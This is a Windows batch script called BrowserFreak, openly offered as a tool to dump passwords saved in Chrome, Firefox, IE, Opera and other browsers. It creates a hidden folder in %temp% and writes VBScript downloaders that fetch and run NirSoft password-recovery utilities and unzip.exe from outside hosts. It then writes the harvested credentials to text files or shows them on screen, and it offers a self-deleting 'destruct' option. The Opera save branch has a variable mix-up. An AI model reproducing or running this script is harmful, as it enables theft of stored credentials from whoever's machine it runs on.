@echo off
GOTO EndComment
Title: BrowserFreak

Description: An automated tool to dump the saved passwords from
	your web browser.

Author: Osanda Malith (@OsandaMalith)

Disclaimer: This tool is meant for ethical (legal) purposes only.

Notes:	Please note this tool may contain errors, and
	is provided "as it is". There is no guarantee
	that it will work on your target server(s), as
	the code may have to be adapted. 
	This is to avoid script kiddie abuse as well.
	
License:
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.
 
    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.
 
    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
:EndComment
title Browser Freak v1.1 Coded by Osanda Malith
:menu
taskkill /IM wscript.exe /F > nul 2>&1
cls 
color 17
echo 8""""8                                          
echo 8    8   eeeee  eeeee e   e  e eeeee eeee eeeee 
echo 8eeee8ee 8   8  8  88 8   8  8 8   " 8    8   8 
echo 88     8 8eee8e 8   8 8e  8  8 8eeee 8eee 8eee8e
echo 88     8 88   8 8   8 88  8  8    88 88   88   8
echo 88eeeee8 88   8 8eee8 88ee8ee8 8ee88 88ee 88   8
echo.
echo 	8""""                         
echo 	8     eeeee  eeee eeeee e   e 
echo 	8eeee 8   8  8    8   8 8   8 
echo 	88    8eee8e 8eee 8eee8 8eee8e
echo 	88    88   8 88   88  8 88   8
echo 	88    88   8 88ee 88  8 88   8
echo[
echo [+] Coded by Osanda Malith
echo [+] Email: osanda [at] unseen.is
echo [+] Follow @OsandaMalith								   

::Test for temp directory::
if exist %temp%\freak (goto options) else (goto makedir)

:::::::::::::::::::::::::::
::Making Directory temp::
:makedir
md %temp%\freak > nul 
attrib +S +H %temp%\freak
::Internet::
:internet                                                       
ECHO [!] Checking your internet connection, please wait...
PING -n 1 www.google.com|find "Reply from " >NUL
IF NOT ERRORLEVEL 1 goto download
IF     ERRORLEVEL 1 goto nointernet
::Downloading ZIP::
:download
echo [!] Loading Please wait...
echo strFileURL = "http://stahlworks.com/dev/unzip.exe" > %temp%\freak\down.vbs
echo strHDLocation = "%temp%\freak\unzip.exe" >> %temp%\freak\down.vbs
echo Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP") >> %temp%\freak\down.vbs
echo objXMLHTTP.open "GET", strFileURL, false >> %temp%\freak\down.vbs
echo objXMLHTTP.send() >> %temp%\freak\down.vbs
echo If objXMLHTTP.Status = 200 Then >> %temp%\freak\down.vbs
echo Set objADOStream = CreateObject("ADODB.Stream") >> %temp%\freak\down.vbs
echo objADOStream.Open >> %temp%\freak\down.vbs
echo objADOStream.Type = 1 >> %temp%\freak\down.vbs
echo objADOStream.Write objXMLHTTP.ResponseBody >> %temp%\freak\down.vbs
echo objADOStream.Position = 0 >> %temp%\freak\down.vbs
echo Set objFSO = Createobject("Scripting.FileSystemObject") >> %temp%\freak\down.vbs
echo If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation >> %temp%\freak\down.vbs
echo Set objFSO = Nothing >> %temp%\freak\down.vbs
echo objADOStream.SaveToFile strHDLocation >> %temp%\freak\down.vbs
echo objADOStream.Close >> %temp%\freak\down.vbs
echo Set objADOStream = Nothing >> %temp%\freak\down.vbs
echo End if >> %temp%\freak\down.vbs
echo Set objXMLHTTP = Nothing >> %temp%\freak\down.vbs
call %temp%\freak\down.vbs

::Downlaod Chrome::

echo strFileURL = "http://www.nirsoft.net/utils/chromepass.zip" > %temp%\freak\chrome.vbs
echo strHDLocation = "%temp%\freak\chromepass.zip" >> %temp%\freak\chrome.vbs
echo Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP") >> %temp%\freak\chrome.vbs
echo objXMLHTTP.open "GET", strFileURL, false >> %temp%\freak\chrome.vbs
echo objXMLHTTP.send() >> %temp%\freak\chrome.vbs
echo If objXMLHTTP.Status = 200 Then >> %temp%\freak\chrome.vbs
echo Set objADOStream = CreateObject("ADODB.Stream") >> %temp%\freak\chrome.vbs
echo objADOStream.Open >> %temp%\freak\chrome.vbs
echo objADOStream.Type = 1 >> %temp%\freak\chrome.vbs
echo objADOStream.Write objXMLHTTP.ResponseBody >> %temp%\freak\chrome.vbs
echo objADOStream.Position = 0 >> %temp%\freak\chrome.vbs
echo Set objFSO = Createobject("Scripting.FileSystemObject") >> %temp%\freak\chrome.vbs
echo If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation >> %temp%\freak\chrome.vbs
echo Set objFSO = Nothing >> %temp%\freak\chrome.vbs
echo objADOStream.SaveToFile strHDLocation >> %temp%\freak\chrome.vbs
echo objADOStream.Close >> %temp%\freak\chrome.vbs
echo Set objADOStream = Nothing >> %temp%\freak\chrome.vbs
echo End if >> %temp%\freak\chrome.vbs
echo Set objXMLHTTP = Nothing >> %temp%\freak\chrome.vbs
call %temp%\freak\chrome.vbs

::Download Firefox::
echo strFileURL = "http://www.nirsoft.net/utils/passwordfox.zip" > %temp%\freak\fire.vbs
echo strHDLocation = "%temp%\freak\passwordfox.zip" >> %temp%\freak\fire.vbs
echo Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP") >> %temp%\freak\fire.vbs
echo objXMLHTTP.open "GET", strFileURL, false >> %temp%\freak\fire.vbs
echo objXMLHTTP.send() >> %temp%\freak\fire.vbs
echo If objXMLHTTP.Status = 200 Then >> %temp%\freak\fire.vbs
echo Set objADOStream = CreateObject("ADODB.Stream") >> %temp%\freak\fire.vbs
echo objADOStream.Open >> %temp%\freak\fire.vbs
echo objADOStream.Type = 1 >> %temp%\freak\fire.vbs
echo objADOStream.Write objXMLHTTP.ResponseBody >> %temp%\freak\fire.vbs
echo objADOStream.Position = 0 >> %temp%\freak\fire.vbs
echo Set objFSO = Createobject("Scripting.FileSystemObject") >> %temp%\freak\fire.vbs
echo If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation >> %temp%\freak\fire.vbs
echo Set objFSO = Nothing >> %temp%\freak\fire.vbs
echo objADOStream.SaveToFile strHDLocation >> %temp%\freak\fire.vbs
echo objADOStream.Close >> %temp%\freak\fire.vbs
echo Set objADOStream = Nothing >> %temp%\freak\fire.vbs
echo End if >> %temp%\freak\fire.vbs
echo Set objXMLHTTP = Nothing >> %temp%\freak\fire.vbs
call %temp%\freak\fire.vbs

::Download IE::
echo strFileURL = "http://www.nirsoft.net/utils/iepv.zip" > %temp%\freak\ie.vbs
echo strHDLocation = "%temp%\freak\iepv.zip" >> %temp%\freak\ie.vbs
echo Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP") >> %temp%\freak\ie.vbs
echo objXMLHTTP.open "GET", strFileURL, false >> %temp%\freak\ie.vbs
echo objXMLHTTP.send() >> %temp%\freak\ie.vbs
echo If objXMLHTTP.Status = 200 Then >> %temp%\freak\ie.vbs
echo Set objADOStream = CreateObject("ADODB.Stream") >> %temp%\freak\ie.vbs
echo objADOStream.Open >> %temp%\freak\ie.vbs
echo objADOStream.Type = 1 >> %temp%\freak\ie.vbs
echo objADOStream.Write objXMLHTTP.ResponseBody >> %temp%\freak\ie.vbs
echo objADOStream.Position = 0 >> %temp%\freak\ie.vbs
echo Set objFSO = Createobject("Scripting.FileSystemObject") >> %temp%\freak\ie.vbs
echo If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation >> %temp%\freak\ie.vbs
echo Set objFSO = Nothing >> %temp%\freak\ie.vbs
echo objADOStream.SaveToFile strHDLocation >> %temp%\freak\ie.vbs
echo objADOStream.Close >> %temp%\freak\ie.vbs
echo Set objADOStream = Nothing >> %temp%\freak\ie.vbs
echo End if >> %temp%\freak\ie.vbs
echo Set objXMLHTTP = Nothing >> %temp%\freak\ie.vbs
call %temp%\freak\ie.vbs

::Download Opera::
echo strFileURL = "http://www.nirsoft.net/utils/operapassview.zip" > %temp%\freak\opera.vbs
echo strHDLocation = "%temp%\freak\operapassview.zip" >> %temp%\freak\opera.vbs
echo Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP") >> %temp%\freak\opera.vbs
echo objXMLHTTP.open "GET", strFileURL, false >> %temp%\freak\opera.vbs
echo objXMLHTTP.send() >> %temp%\freak\opera.vbs
echo If objXMLHTTP.Status = 200 Then >> %temp%\freak\opera.vbs
echo Set objADOStream = CreateObject("ADODB.Stream") >> %temp%\freak\opera.vbs
echo objADOStream.Open >> %temp%\freak\opera.vbs
echo objADOStream.Type = 1 >> %temp%\freak\opera.vbs
echo objADOStream.Write objXMLHTTP.ResponseBody >> %temp%\freak\opera.vbs
echo objADOStream.Position = 0 >> %temp%\freak\opera.vbs
echo Set objFSO = Createobject("Scripting.FileSystemObject") >> %temp%\freak\opera.vbs
echo If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation >> %temp%\freak\opera.vbs
echo Set objFSO = Nothing >> %temp%\freak\opera.vbs
echo objADOStream.SaveToFile strHDLocation >> %temp%\freak\opera.vbs
echo objADOStream.Close >> %temp%\freak\opera.vbs
echo Set objADOStream = Nothing >> %temp%\freak\opera.vbs
echo End if >> %temp%\freak\opera.vbs
echo Set objXMLHTTP = Nothing >> %temp%\freak\opera.vbs
call %temp%\freak\opera.vbs

::Download All:
echo strFileURL = "http://nirsoft.net/utils/webbrowserpassview.zip" > %temp%\freak\all.vbs
echo strHDLocation = "%temp%\freak\webbrowserpassview.zip" >> %temp%\freak\all.vbs
echo Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP") >> %temp%\freak\all.vbs
echo objXMLHTTP.open "GET", strFileURL, false >> %temp%\freak\all.vbs
echo objXMLHTTP.send() >> %temp%\freak\all.vbs
echo If objXMLHTTP.Status = 200 Then >> %temp%\freak\all.vbs
echo Set objADOStream = CreateObject("ADODB.Stream") >> %temp%\freak\all.vbs
echo objADOStream.Open >> %temp%\freak\all.vbs
echo objADOStream.Type = 1 >> %temp%\freak\all.vbs
echo objADOStream.Write objXMLHTTP.ResponseBody >> %temp%\freak\all.vbs
echo objADOStream.Position = 0 >> %temp%\freak\all.vbs
echo Set objFSO = Createobject("Scripting.FileSystemObject") >> %temp%\freak\all.vbs
echo If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation >> %temp%\freak\all.vbs
echo Set objFSO = Nothing >> %temp%\freak\all.vbs
echo objADOStream.SaveToFile strHDLocation >> %temp%\freak\all.vbs
echo objADOStream.Close >> %temp%\freak\all.vbs
echo Set objADOStream = Nothing >> %temp%\freak\all.vbs
echo End if >> %temp%\freak\all.vbs
echo Set objXMLHTTP = Nothing >> %temp%\freak\all.vbs
call %temp%\freak\all.vbs

echo[													   
echo [*] Welcome to the Browser Dumper

::Options::
:options
ver | find /i "version 6.2." > nul
if %errorlevel%==0 set $VERSIONWINDOWS=Windows 8
ver | find /i "version 6.1." > nul
if %errorlevel%==0 set $VERSIONWINDOWS=Windows 7
ver | find /i "version 6.0." > nul
if %errorlevel%==0 set $VERSIONWINDOWS=Windows Vista
ver | find /i "version 5.1." > nul
if %errorlevel%==0 set $VERSIONWINDOWS=Windows XP
ver | find /i "version 5.2." > nul
if %errorlevel%==0 set $VERSIONWINDOWS=Windows 2003
ver | find /i "Windows 2000" > nul
if %errorlevel%==0 set $VERSIONWINDOWS=Windows 2000
ver | find /i "Windows NT" > nul
if %errorlevel%==0 set $VERSIONWINDOWS=Windows NT
ver | find /i ">Windows ME" > nul
if %errorlevel%==0 set $VERSIONWINDOWS=Windows ME
ver | find /i "Windows 98" > nul
if %errorlevel%==0 set $VERSIONWINDOWS=Windows 98
ver | find /i "Windows 95" > nul
if %errorlevel%==0 set $VERSIONWINDOWS=Windows 95

REM Identify bit
IF NOT EXIST "%SYSTEMDRIVE%\Program Files (x86)" set $VERSIONBIT=32 bit
IF EXIST "%SYSTEMDRIVE%\Program Files (x86)" set $VERSIONBIT=64 bit

REM Display result
echo [~] You are Running %$VERSIONWINDOWS% %$VERSIONBIT%
echo.
::Voice::
echo StrText="Welcome to the Browser Freak. Coded by Osanda Malith" > %temp%\freak\spk.vbs
echo StrText2 = "Please pick A option" >> %temp%\freak\spk.vbs
echo set ObjVoice=CreateObject("SAPI.SpVoice") >> %temp%\freak\spk.vbs
echo ObjVoice.Speak StrText >> %temp%\freak\spk.vbs
echo ObjVoice.Speak StrText2 >> %temp%\freak\spk.vbs
start %temp%\freak\spk.vbs
echo [~] Choose a Option
echo 1. Dump Chrome Passwords
echo 2. Dump Firefox Passwords
echo 3. Dump IE Passwords
echo 4. Dump Opera Passwords
echo 5. Dump all Passwords (including Safari)
echo 6. Destruct all of this and exit
echo 7. Exit normally
set /p "opt=>"
:l
if %opt% == 1 goto chrome
if %opt% == 2 goto firefox
if %opt% == 3 goto IE
if %opt% == 4 goto opera
if %opt% == 5 goto all
if %opt% == 6 goto kill
if %opt% == 7 goto end
if %opt% == "" goto l
echo Enter a Choice >.< goto l

:chrome
cls
color 17
::Voice::
taskkill /IM wscript.exe /F > nul 2>&1
echo StrText="Welcome to the Chrome Password Dumper coded by Osanda Malith" > %temp%\freak\spk.vbs
echo set ObjVoice=CreateObject("SAPI.SpVoice") >> %temp%\freak\spk.vbs
echo ObjVoice.Speak StrText >> %temp%\freak\spk.vbs
start %temp%\freak\spk.vbs
::code of chrome::
echo 8""""8                                
echo 8    " e   e eeeee  eeeee eeeeeee eeee
echo 8e     8   8 8   8  8  88 8  8  8 8   
echo 88     8eee8 8eee8e 8   8 8e 8  8 8eee
echo 88   e 88  8 88   8 8   8 88 8  8 88  
echo 88eee8 88  8 88   8 8eee8 88 8  8 88ee

echo 	8""""8                                
echo 	8    8 e   e eeeeeee eeeee eeee eeeee 
echo 	8e   8 8   8 8  8  8 8   8 8    8   8 
echo 	88   8 8e  8 8e 8  8 8eee8 8eee 8eee8e
echo 	88   8 88  8 88 8  8 88    88   88   8
echo 	88eee8 88ee8 88 8  8 88    88ee 88   8         
echo.
echo [~] Welcome to the Chrome Password Dumper
echo.
call %temp%\freak\unzip.exe -o %temp%\freak\chromepass.zip -d %temp%\freak > nul 2>&1
echo [!] Do you want to save the output to a text file(Y/n)
set /p "chrome=>"
if %chrome% == Y goto savechrome
if %chrome% == y goto savechrome 
if %chrome% == N goto nosavechrome 
if %chrome% == n goto nosavechrome 

:savechrome
set /p chromefile=[+] Enter a File Name:
start %temp%\freak\ChromePass.exe /stext %chromefile%.txt
echo [+] Successfully saved to %cd%\%chromefile%.txt
echo [+] Press Enter to go to the Main Menu
pause > nul
goto menu

:nosavechrome
start %temp%\freak\ChromePass.exe /stext ch.txt
timeout /t 2 /nobreak > nul
echo [+] Press Enter to View all the Passwords
pause > nul
type ch.txt
del /f /q ch.txt > nul
echo [+] Press Enter to go to the Main Menu
pause > nul
goto menu

::FireFox::
:firefox
cls
color 17
echo 8""""                                 
echo 8     e  eeeee  eeee eeee eeeee e    e
echo 8eeee 8  8   8  8    8    8  88 8    8
echo 88    8e 8eee8e 8eee 8eee 8   8 eeeeee
echo 88    88 88   8 88   88   8   8 88   8
echo 88    88 88   8 88ee 88   8eee8 88   8

echo	 8""""8                                
echo	 8    8 e   e eeeeeee eeeee eeee eeeee 
echo	 8e   8 8   8 8  8  8 8   8 8    8   8 
echo	 88   8 8e  8 8e 8  8 8eee8 8eee 8eee8e
echo	 88   8 88  8 88 8  8 88    88   88   8
echo	 88eee8 88ee8 88 8  8 88    88ee 88   8
::Voice::
taskkill /IM wscript.exe /F >> nul 2>&1
echo StrText="Welcome to the Firefox Password Dumper coded by Osanda Malith" > %temp%\freak\spk.vbs
echo set ObjVoice=CreateObject("SAPI.SpVoice") >> %temp%\freak\spk.vbs
echo ObjVoice.Speak StrText >> %temp%\freak\spk.vbs
start %temp%\freak\spk.vbs
::code::
call %temp%\freak\unzip.exe -o %temp%\freak\passwordfox.zip -d %temp%\freak > nul 2>&1
echo [~] Welcome to the Firefox Password Dumper
echo.
echo [!] Do you want to save the output to a text file(Y/n)
set /p "firefox=>"
if %firefox% == Y goto savefirefox 
if %firefox% == y goto savefirefox 
if %firefox% == N goto nosavefirefox 
if %firefox% == n goto nosavefirefox 

:savefirefox
set /p firefoxfile=[+] Enter a File Name:
start %temp%\freak\PasswordFox.exe /stext %firefoxfile%.txt
echo [+] Successfully saved to %cd%\%firefoxfile%.txt
echo [+] Press Enter to go to the Main Menu
pause > nul
goto menu

:nosavefirefox
start %temp%\freak\PasswordFox.exe /stext ff.txt
timeout /t 2 /nobreak > nul
echo [+] Press Enter to View all the Passwords
pause > nul
type ff.txt
del /f /q ff.txt > nul
echo [+] Press Enter to go to the Main Menu
pause > nul
goto menu


::IE::
:ie
cls
color 17
echo 8  8""""
echo 8  8    
echo 8e 8eeee
echo 88 88   
echo 88 88   
echo 88 88eee

echo	 8""""8                                
echo	 8    8 e   e eeeeeee eeeee eeee eeeee 
echo	 8e   8 8   8 8  8  8 8   8 8    8   8 
echo	 88   8 8e  8 8e 8  8 8eee8 8eee 8eee8e
echo	 88   8 88  8 88 8  8 88    88   88   8
echo	 88eee8 88ee8 88 8  8 88    88ee 88   8
::Voice::
taskkill /IM wscript.exe /F > nul 2>&1 
echo StrText="Welcome to the Internet Explorer Password Dumper coded by Osanda Malith" > %temp%\freak\spk.vbs
echo set ObjVoice=CreateObject("SAPI.SpVoice") >> %temp%\freak\spk.vbs
echo ObjVoice.Speak StrText >> %temp%\freak\spk.vbs
start %temp%\freak\spk.vbs
::code::
call %temp%\freak\unzip.exe -o %temp%\freak\iepv.zip -d %temp%\freak > nul 2>&1
echo [~] Welcome to the Internet Explorer Password Dumper
echo.
echo [!] Do you want to save the output to a text file(Y/n)
set /p "ie=>"
if %ie% == Y goto saveie 
if %ie% == y goto saveie
if %ie% == N goto nosaveie
if %ie% == n goto nosaveie

:saveie
set /p iefile=[+] Enter a File Name:
start %temp%\freak\iepv.exe /stext %iefile%.txt
echo [+] Successfully saved to %cd%\%iefile%.txt
echo [+] Press Enter to go to the Main Menu
pause > nul
goto menu

:nosaveie
start %temp%\freak\iepv.exe /stext ie.txt
timeout /t 2 /nobreak > nul
echo [+] Press Enter to View all the Passwords
pause > nul
type ie.txt
del /f /q ie.txt
echo [+] Press Enter to go to the Main Menu
pause > nul
goto menu

::code of Opera::
:opera
cls
echo 8"""88                        
echo 8    8 eeeee eeee eeeee  eeeee
echo 8    8 8   8 8    8   8  8   8
echo 8    8 8eee8 8eee 8eee8e 8eee8
echo 8    8 88    88   88   8 88  8
echo 8eeee8 88    88ee 88   8 88  8
                              

echo 	8""""8                                
echo 	8    8 e   e eeeeeee eeeee eeee eeeee 
echo 	8e   8 8   8 8  8  8 8   8 8    8   8 
echo 	88   8 8e  8 8e 8  8 8eee8 8eee 8eee8e
echo 	88   8 88  8 88 8  8 88    88   88   8
echo 	88eee8 88ee8 88 8  8 88    88ee 88   8         
echo.
::Voice::
taskkill /IM wscript.exe /F > nul 2>&1 
echo StrText="Welcome to the Opera Browser Password Dumper coded by Osanda Malith" > %temp%\freak\spk.vbs
echo set ObjVoice=CreateObject("SAPI.SpVoice") >> %temp%\freak\spk.vbs
echo ObjVoice.Speak StrText >> %temp%\freak\spk.vbs
start %temp%\freak\spk.vbs
echo [~] Welcome to the Opera Password Dumper
echo.
call %temp%\freak\unzip.exe -o %temp%\freak\operapassview.zip -d %temp%\freak > nul 2>&1
echo [!] Do you want to save the output to a text file(Y/n)
set /p "opera=>"
if %opera% == Y goto saveopera 
if %opera% == y goto saveopera 
if %opera% == N goto nosaveopera 
if %opera% == n goto nosaveopera 

:saveopera

set /p chromefile=[+] Enter a File Name:
start %temp%\freak\OperaPassView.exe /stext %operafile%.txt
echo [+] Successfully saved to %cd%\%operafile%.txt
echo [+] Press Enter to go to the Main Menu
pause > nul
goto menu

:nosaveopera
start %temp%\freak\OperaPassView.exe /stext op.txt
timeout /t 2 /nobreak > nul
echo [+] Press Enter to View all the Passwords
pause > nul
type op.txt
del /f /q op.txt > nul
echo [+] Press Enter to go to the Main Menu
pause > nul
goto menu

::ALL Dumper::
:all
cls
echo 8""""8            
echo 8    8 e     e    
echo 8eeee8 8     8    
echo 88   8 8e    8e   
echo 88   8 88    88   
echo 88   8 88eee 88eee

echo 	8""""8                                
echo 	8    8 e   e eeeeeee eeeee eeee eeeee 
echo 	8e   8 8   8 8  8  8 8   8 8    8   8 
echo 	88   8 8e  8 8e 8  8 8eee8 8eee 8eee8e
echo 	88   8 88  8 88 8  8 88    88   88   8
echo 	88eee8 88ee8 88 8  8 88    88ee 88   8         
echo.
echo [~] Welcome to the All Browser Password Dumper
echo.
::Voice::
taskkill /IM wscript.exe /F > nul 2>&1 
echo StrText="Welcome to the All Browser Password Dumper coded by Osanda Malith" > %temp%\freak\spk.vbs
echo set ObjVoice=CreateObject("SAPI.SpVoice") >> %temp%\freak\spk.vbs
echo ObjVoice.Speak StrText >> %temp%\freak\spk.vbs
start %temp%\freak\spk.vbs
call %temp%\freak\unzip.exe -o %temp%\freak\webbrowserpassview.zip -d %temp%\freak > nul 2>&1
echo [!] Do you want to save the output to a text file(Y/n)
set /p "all=>"
if %all% == Y goto saveall 
if %all% == y goto saveall
if %all% == N goto nosaveall
if %all% == n goto nosaveall

:saveall

set /p allfile=[+] Enter a File Name:
start %temp%\freak\WebBrowserPassview.exe /stext %allfile%.txt
echo [+] Successfully saved to %cd%\%allfile%.txt
echo [+] Press Enter to go to the Main Menu
pause > nul
goto menu

:nosaveall
start %temp%\freak\WebBrowserPassview.exe /stext all.txt
timeout /t 2 /nobreak > nul
echo [+] Press Enter to View all the Passwords
pause > nul
type all.txt
del /f /q all.txt > nul
echo [+] Press Enter to go to the Main Menu
pause > nul
goto menu


:kill
echo Are you sure you want to do this(y/n)
set /p "kill=>"
if %kill% == y goto killdone 
if %kill% == Y goto killdone 
if %kill% == n goto options
if %kill% == N goto options

:killdone
echo @echo off >> kill.bat
rem echo rd /q /s %temp%\freak >> kill.bat
echo del /f /q %0 >> kill.bat
echo del /f /q kill.bat >> kill.bat
start kill.bat
exit


:end
taskkill /IM WScript.exe /F > nul 2>&1 
exit

:nointernet
echo [-] Sorry you have no Internet Access...
taskkill /IM WScript.exe /F > nul 2>&1 
exit
